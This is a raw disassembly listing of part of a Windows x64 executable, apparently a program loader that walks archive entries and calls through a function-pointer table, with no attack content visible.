   140002d3d:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d41:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d45:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140002d4a:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   140002d50:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140002d54:	45 8b c4             	mov    %r12d,%r8d
   140002d57:	33 d2                	xor    %edx,%edx
   140002d59:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002d5e:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140002d63:	ff 15 5f 83 02 00    	call   *0x2835f(%rip)        # 0x14002b0c8
   140002d69:	85 c0                	test   %eax,%eax
   140002d6b:	75 12                	jne    0x140002d7f
   140002d6d:	48 63 d7             	movslq %edi,%rdx
   140002d70:	4c 8d 05 39 8f 02 00 	lea    0x28f39(%rip),%r8        # 0x14002bcb0
   140002d77:	48 8b ce             	mov    %rsi,%rcx
   140002d7a:	e8 31 f9 ff ff       	call   0x1400026b0
   140002d7f:	8b c5                	mov    %ebp,%eax
   140002d81:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002d86:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140002d8c:	4c 8d 05 a5 8f 02 00 	lea    0x28fa5(%rip),%r8        # 0x14002bd38
   140002d93:	33 c9                	xor    %ecx,%ecx
   140002d95:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002d99:	ff 15 79 86 02 00    	call   *0x28679(%rip)        # 0x14002b418
   140002d9f:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   140002da6:	00 
   140002da7:	48 33 cc             	xor    %rsp,%rcx
   140002daa:	e8 11 98 00 00       	call   0x14000c5c0
   140002daf:	48 81 c4 58 20 00 00 	add    $0x2058,%rsp
   140002db6:	41 5f                	pop    %r15
   140002db8:	41 5e                	pop    %r14
   140002dba:	41 5d                	pop    %r13
   140002dbc:	41 5c                	pop    %r12
   140002dbe:	5f                   	pop    %rdi
   140002dbf:	5e                   	pop    %rsi
   140002dc0:	5d                   	pop    %rbp
   140002dc1:	5b                   	pop    %rbx
   140002dc2:	c3                   	ret
   140002dc3:	cc                   	int3
   140002dc4:	cc                   	int3
   140002dc5:	cc                   	int3
   140002dc6:	cc                   	int3
   140002dc7:	cc                   	int3
   140002dc8:	cc                   	int3
   140002dc9:	cc                   	int3
   140002dca:	cc                   	int3
   140002dcb:	cc                   	int3
   140002dcc:	cc                   	int3
   140002dcd:	cc                   	int3
   140002dce:	cc                   	int3
   140002dcf:	cc                   	int3
   140002dd0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002dd5:	56                   	push   %rsi
   140002dd6:	57                   	push   %rdi
   140002dd7:	41 55                	push   %r13
   140002dd9:	41 56                	push   %r14
   140002ddb:	41 57                	push   %r15
   140002ddd:	48 83 ec 30          	sub    $0x30,%rsp
   140002de1:	48 8b 05 58 f0 03 00 	mov    0x3f058(%rip),%rax        # 0x140041e40
   140002de8:	4c 8b f9             	mov    %rcx,%r15
   140002deb:	48 8d 0d 2e 90 02 00 	lea    0x2902e(%rip),%rcx        # 0x14002be20
   140002df2:	41 8b f9             	mov    %r9d,%edi
   140002df5:	49 8b d8             	mov    %r8,%rbx
   140002df8:	48 8b f2             	mov    %rdx,%rsi
   140002dfb:	45 33 f6             	xor    %r14d,%r14d
   140002dfe:	ff 15 ac 86 02 00    	call   *0x286ac(%rip)        # 0x14002b4b0
   140002e04:	4c 8b e8             	mov    %rax,%r13
   140002e07:	48 85 c0             	test   %rax,%rax
   140002e0a:	0f 84 9c 01 00 00    	je     0x140002fac
   140002e10:	48 8b c8             	mov    %rax,%rcx
   140002e13:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140002e18:	48 8b 05 51 f0 03 00 	mov    0x3f051(%rip),%rax        # 0x140041e70
   140002e1f:	48 8d 15 0a 90 02 00 	lea    0x2900a(%rip),%rdx        # 0x14002be30
   140002e26:	ff 15 84 86 02 00    	call   *0x28684(%rip)        # 0x14002b4b0
   140002e2c:	4c 8b e0             	mov    %rax,%r12
   140002e2f:	48 85 c0             	test   %rax,%rax
   140002e32:	0f 84 5f 01 00 00    	je     0x140002f97
   140002e38:	48 8b c8             	mov    %rax,%rcx
   140002e3b:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140002e40:	48 8b 05 21 f0 03 00 	mov    0x3f021(%rip),%rax        # 0x140041e68
   140002e47:	4c 8b cb             	mov    %rbx,%r9
   140002e4a:	4c 8b c6             	mov    %rsi,%r8
   140002e4d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002e52:	49 8b d7             	mov    %r15,%rdx
   140002e55:	41 8b ee             	mov    %r14d,%ebp
   140002e58:	ff 15 52 86 02 00    	call   *0x28652(%rip)        # 0x14002b4b0
   140002e5e:	4c 8b f8             	mov    %rax,%r15
   140002e61:	48 85 c0             	test   %rax,%rax
   140002e64:	0f 84 08 01 00 00    	je     0x140002f72
   140002e6a:	85 ff                	test   %edi,%edi
   140002e6c:	75 18                	jne    0x140002e86
   140002e6e:	48 8b c8             	mov    %rax,%rcx
   140002e71:	48 8b 05 08 f0 03 00 	mov    0x3f008(%rip),%rax        # 0x140041e80
   140002e78:	ff 15 32 86 02 00    	call   *0x28632(%rip)        # 0x14002b4b0
   140002e7e:	48 8b e8             	mov    %rax,%rbp
   140002e81:	e9 c7 00 00 00       	jmp    0x140002f4d
   140002e86:	48 8b 05 43 f0 03 00 	mov    0x3f043(%rip),%rax        # 0x140041ed0
   140002e8d:	48 8d 0d ad 8f 02 00 	lea    0x28fad(%rip),%rcx        # 0x14002be41
   140002e94:	ff 15 16 86 02 00    	call   *0x28616(%rip)        # 0x14002b4b0
   140002e9a:	48 8b d8             	mov    %rax,%rbx
   140002e9d:	48 8b c8             	mov    %rax,%rcx
   140002ea0:	48 8b 05 31 f0 03 00 	mov    0x3f031(%rip),%rax        # 0x140041ed8
   140002ea7:	49 8b d7             	mov    %r15,%rdx
   140002eaa:	ff 15 00 86 02 00    	call   *0x28600(%rip)        # 0x14002b4b0
   140002eb0:	48 8b e8             	mov    %rax,%rbp
   140002eb3:	48 8b cb             	mov    %rbx,%rcx
   140002eb6:	48 8b 05 d3 ee 03 00 	mov    0x3eed3(%rip),%rax        # 0x140041d90
   140002ebd:	ff 15 ed 85 02 00    	call   *0x285ed(%rip)        # 0x14002b4b0
   140002ec3:	83 ff 02             	cmp    $0x2,%edi
   140002ec6:	0f 85 81 00 00 00    	jne    0x140002f4d
   140002ecc:	48 8b 05 fd ef 03 00 	mov    0x3effd(%rip),%rax        # 0x140041ed0
   140002ed3:	48 8d 0d 6a 8f 02 00 	lea    0x28f6a(%rip),%rcx        # 0x14002be44
   140002eda:	ff 15 d0 85 02 00    	call   *0x285d0(%rip)        # 0x14002b4b0
   140002ee0:	48 8b f0             	mov    %rax,%rsi
   140002ee3:	48 8d 0d 5e 8f 02 00 	lea    0x28f5e(%rip),%rcx        # 0x14002be48
   140002eea:	48 8b 05 df ef 03 00 	mov    0x3efdf(%rip),%rax        # 0x140041ed0
   140002ef1:	ff 15 b9 85 02 00    	call   *0x285b9(%rip)        # 0x14002b4b0
   140002ef7:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140002efe:	48 8b d6             	mov    %rsi,%rdx
   140002f01:	48 8b f8             	mov    %rax,%rdi
   140002f04:	4c 8b c0             	mov    %rax,%r8
   140002f07:	48 8b 05 d2 ef 03 00 	mov    0x3efd2(%rip),%rax        # 0x140041ee0
   140002f0e:	48 8b cd             	mov    %rbp,%rcx
   140002f11:	ff 15 99 85 02 00    	call   *0x28599(%rip)        # 0x14002b4b0
   140002f17:	48 8b d8             	mov    %rax,%rbx
   140002f1a:	48 8b ce             	mov    %rsi,%rcx
   140002f1d:	48 8b 05 6c ee 03 00 	mov    0x3ee6c(%rip),%rax        # 0x140041d90
   140002f24:	ff 15 86 85 02 00    	call   *0x28586(%rip)        # 0x14002b4b0
   140002f2a:	48 8b 05 5f ee 03 00 	mov    0x3ee5f(%rip),%rax        # 0x140041d90
   140002f31:	48 8b cf             	mov    %rdi,%rcx
   140002f34:	ff 15 76 85 02 00    	call   *0x28576(%rip)        # 0x14002b4b0
   140002f3a:	48 8b 05 4f ee 03 00 	mov    0x3ee4f(%rip),%rax        # 0x140041d90
   140002f41:	48 8b cd             	mov    %rbp,%rcx
   140002f44:	ff 15 66 85 02 00    	call   *0x28566(%rip)        # 0x14002b4b0
   140002f4a:	48 8b eb             	mov    %rbx,%rbp
   140002f4d:	48 85 ed             	test   %rbp,%rbp
   140002f50:	74 20                	je     0x140002f72
   140002f52:	48 8b 05 57 ef 03 00 	mov    0x3ef57(%rip),%rax        # 0x140041eb0
   140002f59:	48 8b cd             	mov    %rbp,%rcx
   140002f5c:	ff 15 4e 85 02 00    	call   *0x2854e(%rip)        # 0x14002b4b0
   140002f62:	48 85 c0             	test   %rax,%rax
   140002f65:	74 0b                	je     0x140002f72
   140002f67:	48 8b c8             	mov    %rax,%rcx
   140002f6a:	e8 05 75 01 00       	call   0x14001a474
   140002f6f:	4c 8b f0             	mov    %rax,%r14
   140002f72:	48 8b 05 17 ee 03 00 	mov    0x3ee17(%rip),%rax        # 0x140041d90
   140002f79:	49 8b cf             	mov    %r15,%rcx
   140002f7c:	ff 15 2e 85 02 00    	call   *0x2852e(%rip)        # 0x14002b4b0
   140002f82:	48 8b 05 07 ee 03 00 	mov    0x3ee07(%rip),%rax        # 0x140041d90
   140002f89:	48 8b cd             	mov    %rbp,%rcx
   140002f8c:	ff 15 1e 85 02 00    	call   *0x2851e(%rip)        # 0x14002b4b0
   140002f92:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002f97:	48 8b 05 f2 ed 03 00 	mov    0x3edf2(%rip),%rax        # 0x140041d90
   140002f9e:	49 8b cc             	mov    %r12,%rcx
   140002fa1:	ff 15 09 85 02 00    	call   *0x28509(%rip)        # 0x14002b4b0
   140002fa7:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140002fac:	48 8b 05 dd ed 03 00 	mov    0x3eddd(%rip),%rax        # 0x140041d90
   140002fb3:	49 8b cd             	mov    %r13,%rcx
   140002fb6:	ff 15 f4 84 02 00    	call   *0x284f4(%rip)        # 0x14002b4b0
   140002fbc:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002fc1:	49 8b c6             	mov    %r14,%rax
   140002fc4:	48 83 c4 30          	add    $0x30,%rsp
   140002fc8:	41 5f                	pop    %r15
   140002fca:	41 5e                	pop    %r14
   140002fcc:	41 5d                	pop    %r13
   140002fce:	5f                   	pop    %rdi
   140002fcf:	5e                   	pop    %rsi
   140002fd0:	c3                   	ret
   140002fd1:	cc                   	int3
   140002fd2:	cc                   	int3
   140002fd3:	cc                   	int3
   140002fd4:	cc                   	int3
   140002fd5:	cc                   	int3
   140002fd6:	cc                   	int3
   140002fd7:	cc                   	int3
   140002fd8:	cc                   	int3
   140002fd9:	cc                   	int3
   140002fda:	cc                   	int3
   140002fdb:	cc                   	int3
   140002fdc:	cc                   	int3
   140002fdd:	cc                   	int3
   140002fde:	cc                   	int3
   140002fdf:	cc                   	int3
   140002fe0:	40 56                	rex push %rsi
   140002fe2:	41 55                	push   %r13
   140002fe4:	41 57                	push   %r15
   140002fe6:	b8 70 10 00 00       	mov    $0x1070,%eax
   140002feb:	e8 d0 98 00 00       	call   0x14000c8c0
   140002ff0:	48 2b e0             	sub    %rax,%rsp
   140002ff3:	48 8b 05 46 b0 03 00 	mov    0x3b046(%rip),%rax        # 0x14003e040
   140002ffa:	48 33 c4             	xor    %rsp,%rax
   140002ffd:	48 89 84 24 50 10 00 	mov    %rax,0x1050(%rsp)
   140003004:	00 
   140003005:	48 8b b1 10 20 00 00 	mov    0x2010(%rcx),%rsi
   14000300c:	4c 8b e9             	mov    %rcx,%r13
   14000300f:	48 8b 05 1a ee 03 00 	mov    0x3ee1a(%rip),%rax        # 0x140041e30
   140003016:	48 8d 0d 33 8e 02 00 	lea    0x28e33(%rip),%rcx        # 0x14002be50
   14000301d:	ff 15 8d 84 02 00    	call   *0x2848d(%rip)        # 0x14002b4b0
   140003023:	4c 8b f8             	mov    %rax,%r15
   140003026:	48 85 c0             	test   %rax,%rax
   140003029:	75 16                	jne    0x140003041
   14000302b:	48 8d 0d 2e 8e 02 00 	lea    0x28e2e(%rip),%rcx        # 0x14002be60
   140003032:	e8 d9 f6 ff ff       	call   0x140002710
   140003037:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000303c:	e9 a9 01 00 00       	jmp    0x1400031ea
   140003041:	48 8b 05 10 ee 03 00 	mov    0x3ee10(%rip),%rax        # 0x140041e58
   140003048:	49 8b cf             	mov    %r15,%rcx
   14000304b:	4c 89 a4 24 68 10 00 	mov    %r12,0x1068(%rsp)
   140003052:	00 
   140003053:	ff 15 57 84 02 00    	call   *0x28457(%rip)        # 0x14002b4b0
   140003059:	4c 8b e0             	mov    %rax,%r12
   14000305c:	48 85 c0             	test   %rax,%rax
   14000305f:	75 16                	jne    0x140003077
   140003061:	48 8d 0d 18 8e 02 00 	lea    0x28e18(%rip),%rcx        # 0x14002be80
   140003068:	e8 a3 f6 ff ff       	call   0x140002710
   14000306d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003072:	e9 6b 01 00 00       	jmp    0x1400031e2
   140003077:	48 89 9c 24 98 10 00 	mov    %rbx,0x1098(%rsp)
   14000307e:	00 
   14000307f:	48 8b 9e 08 10 00 00 	mov    0x1008(%rsi),%rbx
   140003086:	48 89 ac 24 a0 10 00 	mov    %rbp,0x10a0(%rsp)
   14000308d:	00 
   14000308e:	48 89 bc 24 a8 10 00 	mov    %rdi,0x10a8(%rsp)
   140003095:	00 
   140003096:	4c 89 b4 24 60 10 00 	mov    %r14,0x1060(%rsp)
   14000309d:	00 
   14000309e:	48 3b 9e 10 10 00 00 	cmp    0x1010(%rsi),%rbx
   1400030a5:	0f 83 15 01 00 00    	jae    0x1400031c0
   1400030ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030b0:	80 7b 11 73          	cmpb   $0x73,0x11(%rbx)
   1400030b4:	0f 85 eb 00 00 00    	jne    0x1400031a5
   1400030ba:	48 8b d3             	mov    %rbx,%rdx
   1400030bd:	48 8b ce             	mov    %rsi,%rcx
   1400030c0:	e8 ab e3 ff ff       	call   0x140001470
   1400030c5:	48 8b e8             	mov    %rax,%rbp
   1400030c8:	48 85 c0             	test   %rax,%rax
   1400030cb:	0f 84 78 02 00 00    	je     0x140003349
   1400030d1:	4c 8d 73 12          	lea    0x12(%rbx),%r14
   1400030d5:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400030da:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400030df:	4d 8d 8d 22 20 00 00 	lea    0x2022(%r13),%r9
   1400030e6:	4c 8d 05 e3 8d 02 00 	lea    0x28de3(%rip),%r8        # 0x14002bed0
   1400030ed:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400030f4:	00 
   1400030f5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400030fa:	e8 81 eb ff ff       	call   0x140001c80
   1400030ff:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003104:	0f 8d 29 02 00 00    	jge    0x140003333
   14000310a:	48 8b 05 bf ed 03 00 	mov    0x3edbf(%rip),%rax        # 0x140041ed0
   140003111:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003116:	ff 15 94 83 02 00    	call   *0x28394(%rip)        # 0x14002b4b0
   14000311c:	48 8d 15 ed 8d 02 00 	lea    0x28ded(%rip),%rdx        # 0x14002bf10
   140003123:	49 8b cf             	mov    %r15,%rcx
   140003126:	48 8b f8             	mov    %rax,%rdi
   140003129:	4c 8b c0             	mov    %rax,%r8
   14000312c:	48 8b 05 45 ed 03 00 	mov    0x3ed45(%rip),%rax        # 0x140041e78
   140003133:	ff 15 77 83 02 00    	call   *0x28377(%rip)        # 0x14002b4b0
   140003139:	48 8b 05 50 ec 03 00 	mov    0x3ec50(%rip),%rax        # 0x140041d90
   140003140:	48 8b cf             	mov    %rdi,%rcx
   140003143:	ff 15 67 83 02 00    	call   *0x28367(%rip)        # 0x14002b4b0
   140003149:	8b 53 0c             	mov    0xc(%rbx),%edx
   14000314c:	48 8b cd             	mov    %rbp,%rcx
   14000314f:	48 8b 05 f2 ec 03 00 	mov    0x3ecf2(%rip),%rax        # 0x140041e48
   140003156:	ff 15 54 83 02 00    	call   *0x28354(%rip)        # 0x14002b4b0
   14000315c:	48 8b cd             	mov    %rbp,%rcx
   14000315f:	48 8b f8             	mov    %rax,%rdi
   140003162:	e8 39 1e 01 00       	call   0x140014fa0
   140003167:	48 85 ff             	test   %rdi,%rdi
   14000316a:	0f 84 9d 01 00 00    	je     0x14000330d
   140003170:	48 8b 05 01 ed 03 00 	mov    0x3ed01(%rip),%rax        # 0x140041e78
   140003177:	48 8d 15 ca 8d 02 00 	lea    0x28dca(%rip),%rdx        # 0x14002bf48
   14000317e:	4c 8b c7             	mov    %rdi,%r8
   140003181:	49 8b cf             	mov    %r15,%rcx
   140003184:	ff 15 26 83 02 00    	call   *0x28326(%rip)        # 0x14002b4b0
   14000318a:	48 8b 05 97 ec 03 00 	mov    0x3ec97(%rip),%rax        # 0x140041e28
   140003191:	4d 8b c4             	mov    %r12,%r8
   140003194:	49 8b d4             	mov    %r12,%rdx
   140003197:	48 8b cf             	mov    %rdi,%rcx
   14000319a:	ff 15 10 83 02 00    	call   *0x28310(%rip)        # 0x14002b4b0
   1400031a0:	48 85 c0             	test   %rax,%rax
   1400031a3:	74 62                	je     0x140003207
   1400031a5:	48 8b d3             	mov    %rbx,%rdx
   1400031a8:	48 8b ce             	mov    %rsi,%rcx
   1400031ab:	e8 90 e7 ff ff       	call   0x140001940
   1400031b0:	48 8b d8             	mov    %rax,%rbx
   1400031b3:	48 3b 86 10 10 00 00 	cmp    0x1010(%rsi),%rax
   1400031ba:	0f 82 f0 fe ff ff    	jb     0x1400030b0
   1400031c0:	33 c0                	xor    %eax,%eax
   1400031c2:	48 8b 9c 24 98 10 00 	mov    0x1098(%rsp),%rbx
   1400031c9:	00 
   1400031ca:	48 8b bc 24 a8 10 00 	mov    0x10a8(%rsp),%rdi
   1400031d1:	00 
   1400031d2:	48 8b ac 24 a0 10 00 	mov    0x10a0(%rsp),%rbp
   1400031d9:	00 
   1400031da:	4c 8b b4 24 60 10 00 	mov    0x1060(%rsp),%r14
   1400031e1:	00 
   1400031e2:	4c 8b a4 24 68 10 00 	mov    0x1068(%rsp),%r12
   1400031e9:	00 
   1400031ea:	48 8b 8c 24 50 10 00 	mov    0x1050(%rsp),%rcx
   1400031f1:	00 
   1400031f2:	48 33 cc             	xor    %rsp,%rcx
   1400031f5:	e8 c6 93 00 00       	call   0x14000c5c0
   1400031fa:	48 81 c4 70 10 00 00 	add    $0x1070,%rsp
   140003201:	41 5f                	pop    %r15
   140003203:	41 5d                	pop    %r13
   140003205:	5e                   	pop    %rsi
   140003206:	c3                   	ret
   140003207:	48 8b 05 f2 eb 03 00 	mov    0x3ebf2(%rip),%rax        # 0x140041e00
   14000320e:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003213:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003218:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000321d:	ff 15 8d 82 02 00    	call   *0x2828d(%rip)        # 0x14002b4b0
   140003223:	48 8b 05 de eb 03 00 	mov    0x3ebde(%rip),%rax        # 0x140041e08
   14000322a:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000322f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003234:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003239:	ff 15 71 82 02 00    	call   *0x28271(%rip)        # 0x14002b4b0
   14000323f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003244:	33 f6                	xor    %esi,%esi
   140003246:	48 8b 05 33 ec 03 00 	mov    0x3ec33(%rip),%rax        # 0x140041e80
   14000324d:	ff 15 5d 82 02 00    	call   *0x2825d(%rip)        # 0x14002b4b0
   140003253:	48 8b f8             	mov    %rax,%rdi
   140003256:	48 8b c8             	mov    %rax,%rcx
   140003259:	48 8b 05 50 ec 03 00 	mov    0x3ec50(%rip),%rax        # 0x140041eb0
   140003260:	ff 15 4a 82 02 00    	call   *0x2824a(%rip)        # 0x14002b4b0
   140003266:	48 85 c0             	test   %rax,%rax
   140003269:	74 0b                	je     0x140003276
   14000326b:	48 8b c8             	mov    %rax,%rcx
   14000326e:	e8 01 72 01 00       	call   0x14001a474
   140003273:	48 8b f0             	mov    %rax,%rsi
   140003276:	48 8b 05 13 eb 03 00 	mov    0x3eb13(%rip),%rax        # 0x140041d90
   14000327d:	48 8b cf             	mov    %rdi,%rcx
   140003280:	ff 15 2a 82 02 00    	call   *0x2822a(%rip)        # 0x14002b4b0
   140003286:	41 80 bd 78 30 00 00 	cmpb   $0x0,0x3078(%r13)
   14000328d:	00 
   14000328e:	74 0e                	je     0x14000329e
   140003290:	48 8d 0d c1 8c 02 00 	lea    0x28cc1(%rip),%rcx        # 0x14002bf58
   140003297:	e8 d8 71 01 00       	call   0x14001a474
   14000329c:	eb 1a                	jmp    0x1400032b8
   14000329e:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032a3:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400032a9:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032ae:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032b3:	e8 18 fb ff ff       	call   0x140002dd0
   1400032b8:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032bd:	48 8b f8             	mov    %rax,%rdi
   1400032c0:	48 8b 05 59 eb 03 00 	mov    0x3eb59(%rip),%rax        # 0x140041e20
   1400032c7:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032cc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032d1:	ff 15 d9 81 02 00    	call   *0x281d9(%rip)        # 0x14002b4b0
   1400032d7:	48 8b 05 3a eb 03 00 	mov    0x3eb3a(%rip),%rax        # 0x140041e18
   1400032de:	ff 15 cc 81 02 00    	call   *0x281cc(%rip)        # 0x14002b4b0
   1400032e4:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400032e8:	4c 8b c7             	mov    %rdi,%r8
   1400032eb:	48 8b d6             	mov    %rsi,%rdx
   1400032ee:	e8 0d f2 ff ff       	call   0x140002500
   1400032f3:	48 8b ce             	mov    %rsi,%rcx
   1400032f6:	e8 a5 1c 01 00       	call   0x140014fa0
   1400032fb:	48 8b cf             	mov    %rdi,%rcx
   1400032fe:	e8 9d 1c 01 00       	call   0x140014fa0
   140003303:	b8 01 00 00 00       	mov    $0x1,%eax
   140003308:	e9 b5 fe ff ff       	jmp    0x1400031c2
   14000330d:	49 8b d6             	mov    %r14,%rdx
   140003310:	48 8d 0d 09 8c 02 00 	lea    0x28c09(%rip),%rcx        # 0x14002bf20
   140003317:	e8 f4 f3 ff ff       	call   0x140002710
   14000331c:	48 8b 05 f5 ea 03 00 	mov    0x3eaf5(%rip),%rax        # 0x140041e18
   140003323:	ff 15 87 81 02 00    	call   *0x28187(%rip)        # 0x14002b4b0
   140003329:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000332e:	e9 8f fe ff ff       	jmp    0x1400031c2
   140003333:	48 8d 0d a6 8b 02 00 	lea    0x28ba6(%rip),%rcx        # 0x14002bee0
   14000333a:	e8 d1 f3 ff ff       	call   0x140002710
   14000333f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003344:	e9 79 fe ff ff       	jmp    0x1400031c2
   140003349:	48 8d 0d 58 8b 02 00 	lea    0x28b58(%rip),%rcx        # 0x14002bea8
   140003350:	e8 bb f3 ff ff       	call   0x140002710
   140003355:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000335a:	e9 63 fe ff ff       	jmp    0x1400031c2
   14000335f:	cc                   	int3
   140003360:	40 53                	rex push %rbx
   140003362:	48 83 ec 20          	sub    $0x20,%rsp
   140003366:	48 8b d9             	mov    %rcx,%rbx
   140003369:	e8 e2 2f 00 00       	call   0x140006350
   14000336e:	85 c0                	test   %eax,%eax
   140003370:	75 38                	jne    0x1400033aa
   140003372:	48 8b cb             	mov    %rbx,%rcx
   140003375:	c6 83 30 30 00 00 01 	movb   $0x1,0x3030(%rbx)
   14000337c:	e8 6f 31 00 00       	call   0x1400064f0
   140003381:	85 c0                	test   %eax,%eax
   140003383:	75 25                	jne    0x1400033aa
   140003385:	48 8b cb             	mov    %rbx,%rcx
   140003388:	e8 b3 2c 00 00       	call   0x140006040
   14000338d:	85 c0                	test   %eax,%eax
   14000338f:	75 19                	jne    0x1400033aa
   140003391:	48 8b cb             	mov    %rbx,%rcx
   140003394:	e8 37 2e 00 00       	call   0x1400061d0
   140003399:	85 c0                	test   %eax,%eax
   14000339b:	75 0d                	jne    0x1400033aa
   14000339d:	48 8b cb             	mov    %rbx,%rcx
   1400033a0:	48 83 c4 20          	add    $0x20,%rsp
   1400033a4:	5b                   	pop    %rbx
   1400033a5:	e9 36 fc ff ff       	jmp    0x140002fe0
   1400033aa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400033af:	48 83 c4 20          	add    $0x20,%rsp
   1400033b3:	5b                   	pop    %rbx
   1400033b4:	c3                   	ret
   1400033b5:	cc                   	int3
   1400033b6:	cc                   	int3
   1400033b7:	cc                   	int3
   1400033b8:	cc                   	int3
   1400033b9:	cc                   	int3
   1400033ba:	cc                   	int3
   1400033bb:	cc                   	int3
   1400033bc:	cc                   	int3
   1400033bd:	cc                   	int3
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	40 53                	rex push %rbx
   1400033c2:	41 56                	push   %r14
   1400033c4:	b8 f8 30 00 00       	mov    $0x30f8,%eax
   1400033c9:	e8 f2 94 00 00       	call   0x14000c8c0
   1400033ce:	48 2b e0             	sub    %rax,%rsp
   1400033d1:	48 8b 05 68 ac 03 00 	mov    0x3ac68(%rip),%rax        # 0x14003e040
   1400033d8:	48 33 c4             	xor    %rsp,%rax
   1400033db:	48 89 84 24 d0 30 00 	mov    %rax,0x30d0(%rsp)
   1400033e2:	00 
   1400033e3:	48 89 ac 24 18 31 00 	mov    %rbp,0x3118(%rsp)
   1400033ea:	00 
   1400033eb:	45 33 f6             	xor    %r14d,%r14d
   1400033ee:	48 8b e9             	mov    %rcx,%rbp
   1400033f1:	48 89 bc 24 28 31 00 	mov    %rdi,0x3128(%rsp)
   1400033f8:	00 
   1400033f9:	4c 89 ac 24 e8 30 00 	mov    %r13,0x30e8(%rsp)
   140003400:	00 
   140003401:	33 d2                	xor    %edx,%edx
   140003403:	4c 8b a9 10 20 00 00 	mov    0x2010(%rcx),%r13
   14000340a:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   140003410:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003415:	41 8b de             	mov    %r14d,%ebx
   140003418:	e8 23 71 02 00       	call   0x14002a540
   14000341d:	49 8b bd 08 10 00 00 	mov    0x1008(%r13),%rdi
   140003424:	49 3b bd 10 10 00 00 	cmp    0x1010(%r13),%rdi
   14000342b:	0f 83 e1 01 00 00    	jae    0x140003612
   140003431:	4c 89 a4 24 f0 30 00 	mov    %r12,0x30f0(%rsp)
   140003438:	00 
   140003439:	41 bc ff ff ff ff    	mov    $0xffffffff,%r12d
   14000343f:	48 89 b4 24 20 31 00 	mov    %rsi,0x3120(%rsp)
   140003446:	00 
   140003447:	4c 89 bc 24 e0 30 00 	mov    %r15,0x30e0(%rsp)
   14000344e:	00 
   14000344f:	90                   	nop
   140003450:	0f b6 4f 11          	movzbl 0x11(%rdi),%ecx
   140003454:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140003457:	a8 f7                	test   $0xf7,%al
   140003459:	74 17                	je     0x140003472
   14000345b:	80 f9 64             	cmp    $0x64,%cl
   14000345e:	0f 84 02 01 00 00    	je     0x140003566
   140003464:	80 f9 6e             	cmp    $0x6e,%cl
   140003467:	74 09                	je     0x140003472
   140003469:	80 f9 78             	cmp    $0x78,%cl
   14000346c:	0f 85 3a 01 00 00    	jne    0x1400035ac
   140003472:	48 8d 77 12          	lea    0x12(%rdi),%rsi
   140003476:	85 db                	test   %ebx,%ebx
   140003478:	0f 85 7c 01 00 00    	jne    0x1400035fa
   14000347e:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   140003485:	48 85 c9             	test   %rcx,%rcx
   140003488:	74 08                	je     0x140003492
   14000348a:	48 8b d6             	mov    %rsi,%rdx
   14000348d:	e8 4e 41 00 00       	call   0x1400075e0
   140003492:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003497:	4c 8d 8d 22 20 00 00 	lea    0x2022(%rbp),%r9
   14000349e:	4c 8d 05 bf 88 02 00 	lea    0x288bf(%rip),%r8        # 0x14002bd64
   1400034a5:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400034ac:	00 
   1400034ad:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400034b2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034b9:	00 
   1400034ba:	e8 c1 e7 ff ff       	call   0x140001c80
   1400034bf:	3d 00 10 00 00       	cmp    $0x1000,%eax
